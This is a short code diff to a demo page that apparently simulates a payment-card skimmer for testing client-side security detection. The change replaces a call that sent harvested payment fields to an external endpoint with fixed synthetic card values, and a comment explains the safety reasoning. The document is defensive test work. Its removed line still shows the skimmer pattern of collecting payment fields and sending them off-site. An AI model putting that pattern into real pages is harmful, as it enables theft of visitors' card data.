@@ -1565,9 +1565,13 @@ write_files:
       function exfilExternal() {
         if (_exfilSent) { return; }
         _exfilSent = true;
+        // Payload is STATIC synthetic data only — never the real harvested field values. CSD detects
+        // the external DOMAIN (the request itself), not the payload, so synthetic values preserve the
+        // detection signal while guaranteeing no real card data / PII ever leaves the origin, even if
+        // a real visitor types real data into this internet-exposed demo page.
         const payload = JSON.stringify({
           type: "combined_demo",
-          credentials: harvestPaymentFields(),
+          credentials: { pan: "4111111111111111", cvv: "999", exp: "12/99", note: "synthetic demo data" },
           page: window.location.href,
           timestamp: Date.now()
         });
